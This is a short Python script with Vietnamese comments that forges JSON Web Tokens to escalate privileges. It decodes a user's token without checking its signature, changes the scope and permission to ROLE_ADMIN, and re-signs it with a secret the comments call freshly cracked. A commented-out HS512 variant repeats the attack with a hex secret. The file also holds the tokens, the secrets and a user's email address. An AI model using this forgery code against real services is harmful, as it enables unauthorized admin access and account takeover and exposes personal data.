import jwt

# Token user 
token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJoYWhhQGdtYWlsLmNvbSIsInBlcm1pc3Npb24iOlsiUk9MRV9VU0VSIl0sImV4cCI6MTc2NjA0NzQ2MywiaWF0IjoxNzY1MTgzNDYzLCJ1c2VyIjp7ImlkIjo0MywibmFtZSI6ImhhaGEiLCJlbWFpbCI6ImhhaGFAZ21haWwuY29tIn0sInNjb3BlIjoiUk9MRV9VU0VSIn0.BgA189yPBFDvWv9hrDyEQfBVIsuVNAVuJ4cfkcJdDRY"

# Secret vừa crack được
secret = b"ofuwrofuwrofuwrofuwrofuwrofuwrof"

payload = jwt.decode(token, options={"verify_signature": False})

payload["scope"] = "ROLE_ADMIN"
payload["permission"] = ["ROLE_ADMIN"]   

new_token = jwt.encode(payload, secret, algorithm="HS256")
print("TOKEN ADMIN >>>>> ")
print(new_token)






















# import jwt
# import binascii # Thêm thư viện này để xử lý Hex

# # Token user gốc
# token = "eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJoYWhhQGdtYWlsLmNvbSIsImV4cCI6MTc2NTg4NDI5OSwiaWF0IjoxNzY1MDIwMjk5LCJ1c2VyIjp7ImlkIjo0MywibmFtZSI6ImhhaGEiLCJlbWFpbCI6ImhhaGFAZ21haWwuY29tIn0sInNjb3BlIjoiUk9MRV9VU0VSIn0.TeVY2XG4RpUcsMtzPAxnkn93d5Hu6_DEhsp3DW746hmhtL0Tha4m9_lfkHNdmE9rawaTvxKVsYJQk8a1RQbihg"

# # Secret Hex string (bỏ chữ b ở đầu để nó là string bình thường)
# hex_secret = "a3be17bd7445b3227649a05f17fbfadc825af3c07e2efe46bf1527af1cd50dbe6af1fdcdb0a8348e6c950d3f11dca50d16948d64d099eee7c65ab82ef789eaee"

# # CHUYỂN ĐỔI: Hex String -> Raw Bytes
# real_secret_bytes = binascii.unhexlify(hex_secret)

# payload = jwt.decode(token, options={"verify_signature": False})

# # Leo thang đặc quyền
# payload["scope"] = "ROLE_ADMIN" 
# # Lưu ý: Code Java setAuthorityPrefix("") nên scope là ROLE_ADMIN là đúng.

# # Ký lại bằng Raw Bytes
# new_token = jwt.encode(payload, real_secret_bytes, algorithm="HS512")

# print("TOKEN ADMIN FORGED >>>>> ")
# print(new_token)